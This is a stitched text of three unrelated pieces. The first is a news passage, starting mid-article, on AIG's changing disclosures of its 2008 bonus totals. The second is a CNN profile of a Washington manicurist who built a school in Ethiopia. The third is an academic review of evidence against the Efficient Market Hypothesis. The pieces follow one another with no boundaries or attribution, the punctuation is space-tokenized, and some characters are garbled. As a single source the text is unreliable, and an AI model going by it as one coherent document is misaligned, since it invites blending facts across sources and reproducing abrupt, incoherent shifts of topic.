The figure Ashooh offered was , in turn , substantially higher than company CEO Edward Liddy claimed days earlier in testimony before a House Financial Services Subcommittee .
Asked how much AIG had paid in 2008 bonuses , Liddy responded : “ I think it might have been in the range of $ 9 million . ”
“ I was shocked to see that the number has nearly quadrupled this time , ” said Cummings .
“ I simply cannot fathom why this company continues to erode the trust of the public and the U.S. Congress , rather than being forthcoming about these issues from the start . ”
AIG spokesman Ashooh said the company ’s revised accounting is the result of different wording of the questions asked by Cummings and POLITICO .
The new figure of $ 454 million , Ashooh said , “ reflects all types of variable compensation across all of our businesses , ” while the $ 120 million figure he provided earlier reflected only bonuses paid to corporate headquarters executives and high - ranking officers at its major businesses around the world .
Ashooh said the $ 454 million figure includes the $ 120 million he had previously disclosed .
All of the numbers provided are on top of the controversial $ 165 million in retention bonuses offered to employees of a division of the company known as AIG Financial Products .
It was the disclosure of those payments that set off a political firestorm earlier this year .
Washington was stunned that employees of the very unit that had brought AIG to its financial knees were being so richly rewarded — especially after the company received $ 170 billion in taxpayer bailout money .
The controversial payments were described by the company as “ retention agreements ” paid to keep employees from leaving .
But the disclosure of the bonus payments to one division of the company prompted confusion about how big the companywide bonus pool was for 2008 .
That ’s the question that has prompted three different answers from AIG officials .
AIG ’s Ashooh says the account AIG is now offering includes a larger group of employees than had been counted to tabulate the earlier disclosures .
“ I think we ’ve been pretty forthcoming , ” Ashooh said .
“ AIG is not a simple organization .
We ’re answering the question that we think we ’re being asked . ”
The questions from POLITICO and from Cummings were both submitted in writing .
On March 19th , POLITICO asked AIG in an e-mail , “ What was AIG ’s total bonus pool ( outside the retention agreements ) for 2008 ? ”
To that , after some back and forth , AIG offered the $ 120 million figure .
Later in March , Congressman Cummings submitted written questions to AIG , asking : “ Please specify the exact amount in bonuses — not retention payments or any other form of compensation — paid by AIG to employees of any division of AIG in 2008 or paid in 2009 for work performed in 2008 . ”
To that question , AIG disclosed a division by division breakdown of payments totaling $ 454 million .
The company said it maintains “ approximately 374 ” plans that pay variable amounts of compensation based on performance .
Citing the large number of recipients and concerns over the safety of AIG employees , the company declined to provide a list of the names of bonus recipients .
It broke down its results by division , including :
Domestic Life and Foreign Life Operations : 23,851 employees received an average of $ 5,050 each .
Property Casualty Group : 3,943 employees received an average of $ 5,403 each .
Foreign General Insurance Operations : 8,669 employees received an average of $ 5,074 each .
Retirement Services Operations : 1,168 employees received an average of $ 11,889 each .
Financial Services : 5,357 employees received an average of $ 4,994 each .
Asset Management Group : 2,095 employees received an average of $ 51,026 each .
Corporate wide variable plan : 6,410 employees received an average of $ 18,954 each .
The company also disclosed that it is developing a new bonus plan for 2009 in consultation with the Federal Reserve and Treasury .

WASHINGTON ( CNN ) --
When Washington manicurist Lidia Schaefer returned to her native village in Ethiopia , she was troubled by what she saw : children walking three hours each way to attend classes held not in a school , but under a tree .
Lidia Schaefer sold her house and car and set aside tips and part of her salary to raise money for the school .
When she learned in 1998 that one of the girls she 'd met -- Medhine -- had been attacked and killed by a hyena after falling behind other children during the long trek home from school , Schaefer knew she had to act .
She began setting aside a third of her salary and all of her tips , and later sold her house and car , to raise enough money to build a school for the village .
" She 's definitely not your average manicurist , " says Denise Abrahams , a longtime client .
" This is the kind of thing that you hear about Oprah Winfrey doing . "
Do you know a hero ?
Nominations are open at CNN.com / Heroes
For Schaefer , it was simply a matter of doing what felt right .
" I do n't work with my head , " she says .
" I really work with my heart . "
Watch Schaefer 's clients and colleagues discuss her efforts »
Born in Feres Mai , a large village in northern Ethiopia , Schaefer moved to the United States in the mid-1970s when civil war broke out at home .
During her troubling visit back home in the '90s , she recalls , " I promised the children I was going to open a school for them . "
But she had no idea how to tackle such a big project , especially while raising her own two children and working 12 - hour days , six days a week .
Watch Schaefer speak with CNN's Larry King »
The motivation to fulfill her promise came with the news of Medhine 's death .
" That really pushed me to do it , " she says , " to build a school so that would n't happen again . "
Schaefer lobbied the Ethiopian government to donate land in a central location so the school could serve children from several nearby villages .
The decision was made to build a secondary school , since the nearest one was more than 18 miles away .
Back in Washington , Schaefer began setting aside money for construction of the school .
" I was working two days for the school , four days for me , " she recalls .
Her clients and co-workers rallied to help , holding raffles and making contributions .
Several clients bought individual doors or windows for the school .
Watch Schaefer talk about the school »
But Schaefer realized it would n't be enough .
To finish the school , she needed to do something drastic .
In 2002 , she gave up her symbols of the American dream , selling her home and car .
It 's a sacrifice that still stuns her colleagues and friends .
" I could n't believe it , " remembers salon manager Patty Gonzalez .
But Schaefer saw nothing remarkable about her decision .
" I do n't feel like I [ gave ] up a lot , " she says .
" I want [ the children ] to learn , to get something out of their life . "
Schaefer ultimately raised more than $ 250,000 for the school , which was completed in 2006 .
When she went back for the dedication , Schaefer was honored with an elaborate procession through the village .
For her , it was gratifying to see what she 'd accomplished .
" I was so happy , I can't even describe it , " she recalls .
Today , nearly 1,500 students are educated in the school , which boasts an eight - building campus with 16 classrooms , a science lab and library .
" It 's simple , but it 's nice , " Schaefer says .
Though she 'd hoped to name the school in memory of Medhine , the government -- which runs the school -- instead named it the Lidia Secondary School , telling Schaefer , " We want it to be your name so that more people [ will ] be like you . "
Schaefer has indeed inspired many others to follow her example .
When Ethiopian communities around the United States heard about what she 'd been able to achieve , they launched an effort to build more schools in her region of northern Ethiopia .
So far , they 've raised enough money to build 12 schools , due to be completed by July 2009 .
Schaefer still sets aside her tips and wages to support her school and has kept up her fundraising efforts to buy supplies .
A colleague at the salon designed T - shirts to raise money for desks for the students .
Schaefer 's next goal is to equip the school with computers .
" They need computers so they can talk to the whole world , " she says .
Her colleagues and clients say Schaefer serves as an important reminder that people do n't need money or power to make a difference .
" She 's very inspiring to me , " says Gonzalez .
" I 've learned from Lidia that even if the project is big , if your heart is in it , you can do it . "

The Specifics
First , what do we mean by an Efficient Market Hypothesis ?
The simplest explanation would be that securities prices reflect information .
Fama ( 1970 ) made a distinction between three forms of EMH : ( a ) the weak form , ( b ) the semi- strong form , and ( c ) the strong form .
However , it is the semi-strong form of EMH that has formed the basis for most empirical research .
The strong form suggests that securities prices reflect all available information , even private information .
Seyhun ( 1986 , 1998 ) provides sufficient evidence that insiders profit from trading on information not already incorporated into prices .
Hence the strong form does not hold in a world with an uneven playing field .
The semi-strong form of EMH asserts that security prices reflect all publicly available information .
There are no undervalued or overvalued securities and thus , trading rules are incapable of producing superior returns .
When new information is released , it is fully incorporated into the price rather speedily .
The availability of intraday data enabled tests which offer evidence of public information impacting stock prices within minutes ( Patell and Wolfson , 1984 , Gosnell , Keown and Pinkerton , 1996 ) .
The weak form of the hypothesis suggests that past prices or returns reflect future prices or returns .
The inconsistent performance of technical analysts suggests this form holds .
However , Fama ( 1991 ) expanded the concept of the weak form to include predicting future returns with the use of accounting or macroeconomic variables .
As discussed below , the evidence of predictability of returns provides an argument against the weak form .
While the semi-strong form of EMH has formed the basis for most empirical research , recent research has expanded the tests of market efficiency to include the weak form of EMH .
There continues to be disagreement on the degree of market efficiency .
This is exacerbated by the joint hypothesis problem .
Tests of market efficiency must be based on an asset - pricing model .
If the evidence is against market efficiency , it may be because the market is inefficient , or it may be that the model is incorrect .
The literature documented below presents evidence of inefficiencies based on existing models and more recent research findings that cast doubt on these models .
The EMH has provided the theoretical basis for much of the financial market research during the seventies and the eighties .
In the past , most of the evidence seems to have been consistent with the EMH . [ 1 ]
Prices were seen to follow a random walk model and the predictable variations in equity returns , if any , were found to be statistically insignificant .
While most of the studies in the seventies focused on predicting prices from past prices , studies in the eighties also looked at the possibility of forecasting based on variables such as dividend yield ( e.g. Fama & French [ 1988 ] ) , P/E ratios ( e.g. Campbell and Shiller [ 1988 ] ) , and term structure variables ( e.g. Harvey [ 1991 ] ) .
Studies in the nineties looked at inadequacies of current asset pricing models .
The maintained hypothesis of EMH also stimulated a plethora of studies that looked , among other things , at the reaction of the stock market to the announcement of various events such as earnings ( e.g. Ball & Brown [ 1968 ] ) , stock splits ( e.g. Fama , Fisher , Jensen and Roll [ 1969 ] ) , capital expenditure ( e.g. McConnell and Muscarella , [ 1985 ] ) , divestitures ( e.g. Klein [ 1986 ] ) , and takeovers ( e.g. Jensen and Ruback [ 1983 ] ) .
The usefulness or relevance of the information was judged based on the market activity associated with a particular event .
In general , the typical results from event studies showed that security prices seemed to adjust to new information within a day of the event announcement , an inference that is consistent with the EMH . [ 2 ]
Even though there is considerable evidence regarding the existence of efficient markets , one has to bear in mind that there are no universally accepted definitions of crucial terms such as abnormal returns , economic value , and even the null hypothesis of market efficiency .
To this list of caveats , one could add the limitations of econometric procedures on which the empirical tests are based .
The early euphoric research of the seventies was followed by a more cautioned and critical approach to the EMH in the eighties and nineties .
Researchers repeatedly challenged the studies based on EMH by raising critical questions such as : Can the movement in prices be fully attributed to the announcement of events ?
Do public announcements affect prices at all ?
and What could be some of the other factors affecting price movements ?.
For example , Roll ( 1988 ) argues that most price movements for individual stocks cannot be traced to public announcements .
In their analysis of the aggregate stock market , Cutler , Poterba and Summers ( 1989 ) reach similar conclusions .
They report that there is little , if any , correlation between the greatest aggregate market movement and public release of important information .
More recently , Haugen and Baker ( 1996 ) in their analysis of determinants of returns in five countries conclude that " none of the factors related to sensitivities to macroeconomic variables seem to be important determinants of expected stock returns " .
1c . The Current Debate
The accumulating evidence suggests that stock prices can be predicted with a fair degree of reliability .
Two competing explanations have been offered for such behavior .
Proponents of EMH ( e.g. Fama and French [ 1995 ] ) maintain that such predictability results from time - varying equilibrium expected returns generated by rational pricing in an efficient market that compensates for the level of risk undertaken .
Critics of EMH ( e.g. La Porta , Lakonishok , Shliefer , and Vishny [ 1997 ] ) argue that the predictability of stock returns reflects the psychological factors , social movements , noise trading , and fashions or " fads " of irrational investors in a speculative market .
The question about whether predictability of returns represents rational variations in expected returns or arises due to irrational speculative deviations from theoretical values has provided the impetus for fervent intellectual inquiries in the recent years .
The remainder of this paper is motivated largely by this issue , and places greater emphasis on the speculative aspect .
2. Evidence Against EMH and Alternate Theories of Market Behavior
2a . Market Anomalies
The EMH became controversial especially after the detection of certain anomalies in the capital markets .
Some of the main anomalies that have been identified are as follows :
A. The January Effect : Rozeff and Kinney ( 1976 ) were the first to document evidence of higher mean returns in January as compared to other months .
Using NYSE stocks for the period 1904 - 1974 , they find that the average return for the month of January was 3.48 percent as compared to only .42 percent for the other months .
Later studies document the effect persists in more recent years : Bhardwaj and Brooks ( 1992 ) for 1977 - 1986 and Eleswarapu and Reinganum ( 1993 ) for 1961 - 1990 .
The effect has been found to be present in other countries as well ( Gultekin and Gultekin , 1983 ) .
The January effect has also been documented for bonds by Chang and Pinegar ( 1986 ) .
Maxwell ( 1998 ) shows that the bond market effect is strong for non-investment grade bonds , but not for investment grade bonds .
More recently , Bhabra , Dhillon and Ramirez ( 1999 ) document a November effect , which is observed only after the Tax Reform Act of 1986 .
They also find that the January effect is stronger since 1986 .
Taken together , their results support a tax - loss selling explanation of the effect .
B. The Weekend Effect ( or Monday Effect ) : French ( 1980 ) analyzes daily returns of stocks for the period 1953 - 1977 and finds that there is a tendency for returns to be negative on Mondays whereas they are positive on the other days of the week .
He notes that these negative returns are " caused only by the weekend effect and not by a general closed - market effect " .
A trading strategy , which would be profitable in this case , would be to buy stocks on Monday and sell them on Friday .
Kamara ( 1997 ) shows that the S&P 500 has no significant Monday effect after April 1982 , yet he finds the Monday effect undiminished from 1962 - 1993 for a portfolio of smaller U.S. stocks .
Internationally , Agrawal and Tandon ( 1994 ) find significantly negative returns on Monday in nine countries and on Tuesday in eight countries , yet large and positive returns on Friday in 17 of the 18 countries studied .
However their data do not extend beyond 1987 .
Steeley ( 2001 ) finds that the weekend effect in the UK has disappeared in the 1990s .
C. Other Seasonal Effects : Holiday and turn of the month effects have been well documented over time and across countries .
Lakonishok and Smidt ( 1988 ) show that US stock returns are significantly higher at the turn of the month , defined as the last and first three trading days of the month .
Ariel ( 1987 ) shows that returns tend to be higher on the last day of the month .
Cadsby and Ratner ( 1992 ) find similar turn of month effects in some countries and not in others .
Ziemba ( 1991 ) finds evidence of a turn of month effect for Japan when turn of month is defined as the last five and first two trading days of the month .
Hensel and Ziemba ( 1996 ) and Kunkel and Compton ( 1998 ) show how abnormal returns can be earned by exploiting this anomaly .
Lakonishok and Smidt ( 1988 ) , Ariel ( 1990 ) , and Cadsby and Ratner ( 1992 ) all provide evidence to show that returns are , on average , higher the day before a holiday , than on other trading days .
The latter paper shows this for countries other than the U.S. Brockman and Michayluk ( 1998 ) describe the pre-holiday effect as one of the oldest and most consistent of all seasonal regularities .
D. Small Firm Effect : Banz ( 1981 ) published one of the earliest articles on the ' small - firm effect ' which is also known as the ' size - effect ' .
His analysis of the 1936 - 1975 period reveals that excess returns would have been earned by holding stocks of low capitalization companies .
Supporting evidence is provided by Reinganum ( 1981 ) who reports that the risk adjusted annual return of small firms was greater than 20 percent .
If the market were efficient , one would expect the prices of stocks of these companies to go up to a level where the risk adjusted returns to future investors would be normal .
But this did not happen .
E. P/E Ratio Effect : Sanjoy Basu ( 1977 ) shows that stocks of companies with low P/E ratios earned a premium for investors during the period 1957 - 1971 .
An investor who held the low P/E ratio portfolio earned higher returns than an investor who held the entire sample of stocks .
These results also contradict the EMH .
Campbell and Shiller ( 1988 b ) show P/E ratios have reliable forecast power .
Fama and French ( 1995 ) find that market and size factors in earnings help explain market and size factors in returns .
Dechow , Hutton , Meulbroek and Sloan ( 2001 ) document that short - sellers position themselves in stocks of firms with low earnings to price ratios since they are known to have lower future returns .
F. Value - Line Enigma :
The Value - Line organization divides the firm into five groups and ranks them according to their estimated performance based on publicly available information .
Over a five year period starting from 1965 , returns to investors correspond to the rankings given to firms .
That is , higher ranking firms earned higher returns .
Several researchers ( e.g. Stickel , 1985 ) find positive risk - adjusted abnormal ( above average ) returns using value line rankings to form trading strategies , thus challenging the EMH .
G. Over / Under Reaction of Stock Prices to Earnings Announcements :
There is substantial documented evidence on both over and under-reaction to earnings announcements .
DeBondt and Thaler ( 1985 , 1987 ) present evidence that is consistent with stock prices overreacting to current changes in earnings .
They report positive ( negative ) estimated abnormal stock returns for portfolios that previously generated inferior ( superior ) stock price and earning performance .
This could be construed as the prior period stock price behavior overreacting to earnings developments ( Bernard , 1993 ) .
Such interpretation has been challenged by Zarowin ( 1989 ) but is supported by DeBondt and Thaler ( 1990 ) .
Bernard ( 1993 ) provides evidence that is consistent with the initial reaction being too small , and being completed over a period of at least six months .
Ou and Penman ( 1989 ) also argue that the market underutilizes financial statement information .
Bernard ( 1993 ) further notes that such anomalies are not due to research design flaws , inappropriate adjustment for risk , or transaction costs .
Thus , the evidence suggests that information is not impounded in prices instantaneously as the EMH would predict .
H. Standard & Poor�s ( S&P ) Index effect : Harris and Gurel ( 1986 ) and Shleifer ( 1986 ) find a surprising increase in share prices ( up to 3 percent ) on the announcement of a stock 's inclusion into the S&P 500 index .
Since in an efficient market only information should change prices , the positive stock price reaction appears to be contrary to the EMH because there is no new information about the firm other than its inclusion in the index . [ 3 ]
I. Pricing of Closed - end Funds : The Investment Company
Act of 1940 regards all investment funds that do not continuously issue and redeem their shares as closed - end funds .
Unlike open - end funds , closed - end funds do not stand ready to sell or repurchase their securities at the net asset value per share . [ 4 ]
They float a fixed number of shares in an initial public offering and after that , investors wishing to buy or sell shares of a closed - end funds must do so in the secondary market . [ 5 ]
The prices in the secondary market are dictated by the market forces of demand and supply which may not be directly linked to the fund�s fundamental or net asset value .
Malkiel ( 1977 ) argues that the market valuation of closed - end investment company shares reflects mispricing .
As he notes , " The pricing of closed - end funds does then seem to provide an illustration of market imperfection in capital - asset pricing . "
[ Malkiel , 847 ]
In general , the funds have been shown to trade at a discount relative to their net asset values ( See Malkiel , 1977 ; Brickley and Schallheim , 1985 ; Lee , Shleifer and Thaler , 1991 ) .
Between 1970 and 1990 , the average discount on closed - end funds ranged between 5 to 20 percent .
The existence of discounts clearly contradicts the value additivity principle of efficient and frictionless capital markets . [ 6 ]
Reports from the popular press have also commented on mispricing in the closed - end fund market .
As Laderman notes in Business Week ( March 1 , 1993 ) , " America�s financial markets are the most efficient in the world .
But there�s one corner where pockets of inefficiency still exist : closed - end funds " .
J. The Distressed Securities Market :
While the academic literature largely suggests that stocks in the distressed securities market are efficiently priced ( e.g. Ma and Weed [ 1986 ] , Weinstein [ 1987 ] , Fridson and Cherry [ 1990 ] , Blume , Keim and Patel [ 1991 ] , Cornell and Green [ 1991 ] , Eberhart and Sweeney [ 1992 ] , Altman and Eberhart [ 1994 ] , Buell [ 1992 ] ) the popular press has frequently conjectured that the stock pricing may be inefficient during the bankruptcy period . [ 7 ]
For example , the shares of Continental Airlines continued to trade on the AMEX at or about $ 1.50 per share even after the company had negotiated a plan with its creditors that would provide no distribution to the pre-petition equity holders ( WSJ , 1992 ) . [ 8 ]
Investors have always sought superior returns in the securities market and vulture investors have attracted a substantial amount of risk - oriented money by offering the possibility of high returns by exploiting the apparent pricing inefficiencies or anomalies in the market for distressed securities .
As Philip Schaeffer of Robert Fleming Inc. puts it :
" Returns are attractive because of market 's abundant inefficiencies .
Investors who find themselves owners of distressed securities do not understand or want to participate in the market and frequently sell at prices substantially below the investments ' cost .
Distressed investing requires skills involving bankruptcy law , experience and knowledge of the bankruptcy process , and personal contacts .
Consequently , the relatively small number of experienced distressed security investors have a significant advantage over other investors who do not have such expertise , knowledge and experience " .
[ Wall Street Journal , 1991 ]
K. The Weather : Few would argue that sunshine puts people in a good mood .
People in good moods make more optimistic choices and judgments .
Saunders ( 1993 ) shows that the New York Stock Exchange index tends to be negative when it is cloudy .
More recently , Hirshleifer and Shumway ( 2001 ) analyze data for 26 countries from 1982 - 1997 and find that stock market returns are positively correlated with sunshine in almost all of the countries studied .
Interestingly , they find that snow and rain have no predictive power !
These phenomena have been rightly referred to as anomalies because they cannot be explained within the existing paradigm of EMH .
It clearly suggests that information alone is not moving the prices .
[ Roll , 1984 ] [ 9 ]
These anomalies have led researchers to question the EMH and to investigate alternate modes of theorizing market behavior .
Such a development is consistent with Kuhn 's ( 1970 ) route for progress in knowledge .
As he states , " Discovery commences with the awareness of anomaly , i.e. , with the recognition that nature has somehow violated the paradigm induced expectations ... " [ Kuhn , 52 ]
2b . Volatility Tests , Fads , Noise Trading
The greatest stir in academic circles has been created by the results of volatility tests .
These tests are designed to test for rationality of market behavior by examining the volatility of share prices relative to the volatility of the fundamental variables that affect share prices .
The first two studies applying these tests were by Shiller ( 1981 ) and LeRoy and Porter ( 1981 ) .
Shiller tests a model in which stock prices are the present discounted value of future dividends .
LeRoy and Porter use a similar analysis for the bond market .
These studies reveal significant volatility in both the stock and bond markets .
Fluctuations in actual prices greater than those implied by changes in the fundamental variables affecting the prices are inferred by Shiller as being the result of fads or waves of optimistic or pessimistic market psychology .
Schwert ( 1989 ) tests for a relation between stock return volatility and economic activity .
He finds increased volatility in financial asset returns during recessions which might suggest that operating leverage increases during recessions .
He also finds increased volatility in periods where the proportion of new debt issues to new equity issues is larger than a firm�s existing capital structure .
This may be interpreted as evidence of financial leverage affecting volatility .
However neither of these factors plays a dominant role in explaining the time - varying volatility of the stock market .
The volatility tests of Shiller spawned a series of articles .
The results of excess volatility in the stock market have been confirmed by Cochrane ( 1991 ) , West ( 1988 ) , Campbell and Shiller ( 1987 ) , Mankiw , Romer , and Shapiro ( 1985 ) .
The tests have been criticized , largely on methodological grounds , by Ackert and Smith ( 1993 ) , Marsh and Merton ( 1986 ) , Kleidon ( 1986 ) and Flavin ( 1983 ) .
The empirical evidence provided by volatility tests suggests that movements in stock prices cannot be attributed merely to the rational expectations of investors , but also involve an irrational component .
The irrational behavior has been emphasized by Shleifer and Summers ( 1990 ) in their exposition of noise trading .
Shleifer and Summers ( 1990 ) posit that there are two types of investors in the market : ( a ) rational speculators or arbitrageurs who trade on the basis of information and ( b ) noise traders who trade on the basis of imperfect information .
Since noise traders act on imperfect information , they will cause prices to deviate from their equilibrium values .
It is generally understood that arbitrageurs play the crucial role of stabilizing prices .
While arbitrageurs dilute such shifts in prices , they do not eliminate them completely .
Shleifer and Summers assert that the assumption of perfect arbitrage made under EMH is not realistic .
They observe that arbitrage is limited by two types of risk : ( a ) fundamental risk and ( b ) unpredictability of future resale price .
Given limited arbitrage , they argue that securities prices do not merely respond to information but also to " changes in expectations or sentiments that are not fully justified by information . "
[ Shleifer and Summers , 23 ]
An observation of investors � trading strategies ( such as trend chasing ) in the market provides evidence for decision making being guided by " noise " rather than by the rational evaluation of information .
Further support is provided by professional financial analysts spending considerable resources in trying to predict both the changes in fundamentals and also possible changes in sentiment of other investors .
" Tracking these possible indicators of demand makes no sense if prices responded only to fundamental news and not to investor demand .
They make perfect sense , in contrast , in a world where investor sentiment moves prices and so predicting changes in this sentiment pays . "
[ Shleifer and Summers , 26 ]
Black ( 1986 ) also argues that noise traders play a useful role in promoting transactions ( and thus , influencing prices ) as informed traders like to trade with noise traders who provide liquidity .
So long as risk is rewarded and there is limited arbitrage , it is unlikely that market forces would eliminate noise traders and maintain efficient prices .
2c . Models of Human Behavior
In a market consisting of human beings , it seems logical that explanations rooted in human and social psychology would hold great promise in advancing our understanding of stock market behavior .
More recent research has attempted to explain the persistence of anomalies by adopting a psychological perspective .
Evidence in the psychology literature reveals that individuals have limited information processing capabilities , exhibit systematic bias in processing information , are prone to making mistakes , and often tend to rely on the opinion of others .
The damaging attacks on the assumption of human rationality have been spearheaded by Kahneman and Tversky ( 1986 ) in their path breaking article on prospect theory .
The findings of Kahneman and Tversky have brought into question expected utility theory which has been used descriptively and predictively in the finance and economics literature .
They argue that when faced with the complex task of assigning probabilities to uncertain outcomes , individuals often tend to use cognitive heuristics .
While useful in reducing the task to a manageable proportion , these heuristics often lead to systematic biases .
Using simple decision tasks , Kahneman and Tversky are able to demonstrate consistent decision inconsistencies by manipulating the decision frame .
While expected utility theory would predict that individuals would evaluate alternatives in terms of the impact on these alternatives on their final wealth position , it is often found that individuals tend to violate expected utility theory predictions by evaluating the situation in terms of gains and losses relative to some reference point .
The usefulness and validity of Kahneman and Tversky 's propositions have been established by several replications and extensions for situations involving uncertainty by researchers in the fields of accounting , economics , finance , and psychology .
Rabin and Thaler ( 2001 ) show that expected utility theory�s explanation of risk aversion is not plausible by providing examples of how the theory can be wrong and misleading .
They call for a better model of describing choice under uncertainty .
It is now widely agreed that the failure of expected utility theory is due to the failure to recognize the psychological principles governing decision tasks .
The literature on cognitive psychology provides a promising framework for analyzing investors ' behavior in the stock market .
By dropping the stringent assumption of rationality in conventional models , it might be possible to explain some of the persistent anomalous findings .
For example , the observation of overreaction is consistent with the finding that subjects , in general , tend to overreact to new information ( and ignore base rates ) .
Also , agents often allow their decision to be guided by irrelevant points of reference , a phenomenon discussed under " anchoring and adjustment " .
Shiller ( 1984 ) proposes an alternate model of stock prices that recognizes the influence of social psychology .
He attributes the movements in stock prices to social movements .
Since there is no objective evidence on which to base their predictions of stock prices , it is suggested that the final opinion of individual investors may largely reflect the opinion of a larger group .
Thus , excessive volatility in the stock market is often caused by social " fads " which may have very little rational or logical explanation .
Shiller ( 1991 , ch.23 ) also investigates investor behavior during the October 1987 crash by surveying individual investors , institutional investors and stockbrokers .
The survey results indicate that most investors traded because of price changes rather than due to news about fundamentals .
There appear to have been no major economic developments at that time that triggered the crash .
He concludes that it would be wrong to interpret the crash as being due to a change in public opinion about some fundamental economic factor .
Seyhun ( 1990 ) shows that the 1987 crash was a surprise to corporate insiders .
Bates ( 1991 ) tests for market expectations prior to the crash by looking at S&P 500 futures options prices .
Standard pricing models imply that out of the money ( OTM ) puts trade at a slight discount to OTM calls .
However , OTM puts were , at various times in 1987 , priced higher than OTM calls .
This overpricing of OTM puts could only imply an expectation of a market crash or increased market volatility if the market fell .
The prices reveal that the market expected a crash at the beginning of 1987 or in mid-August , when in fact the market actually peaked , and that there was no expectation of a crash in the two months before October 19 .
Research into investor behavior in the securities markets is rapidly expanding with very surprising results , again , results that are often counter to the notion of rational behavior .
Hirshleifer and Shumway ( 2001 ) find that sunshine is strongly correlated with daily stock returns .
Using a unique data set of two years of investor behavior for almost the entire set of investors from Finland , Grinblatt and Keloharju ( 2001 ) find that distance , language , and culture influence stock trades . [ 10 ]
Huberman and Regev ( 2001 ) provide an example of how and not when information is released can cause stock price reactions .
They study the stock price effect of news about a firm developing a cure for cancer .
Although the information had been published a few months earlier in multiple media outlets , the stock price more than quadrupled the day after receiving public attention in the New York Times .
Although there was no new information presented , the form in which it was presented caused a permanent price rise .
The efficient market view of prices representing rational valuation of fundamental factors has also been challenged by Summers ( 1986 ) , who views the market to be highly inefficient .
He proposes that pricing should comprise a random walk plus a fad variable .
The fad variable is modeled as a slowly mean - reverting stationary process .
That is , stock prices will exercise some temporary aberrations , but will eventually return to their equilibrium price levels .
One may argue that market mechanisms may be able to correct the individual decision biases , and thus individual differences may not matter in the aggregate .
However , the transition from micro behavior to macro behavior is still not well established .
For example , in their study of price differences among similar consumer products , Pratt , Wise and Zeckhauser ( 1979 ) demonstrate the failure of the market to correct individual biases .
All arguments aside , the stock market crash of 1987 continues to be problematic for the supporters of EMH .
Any attempt to accommodate a 22.7 percent devaluation of the stocks within the theoretical framework of EMH would be a formidable challenge .
It seems reasonable to assume that the decline did not occur due to a major shift in the perceived risk or expected future dividend .
The crash of 1987 provides further credence to the argument that the market includes a significant number of speculative investors who are guided by " non-fundamental " factors .
Thus , the assumption of rationality in conventional models needs to be rethought and reformulated ( to conform to reality ) .
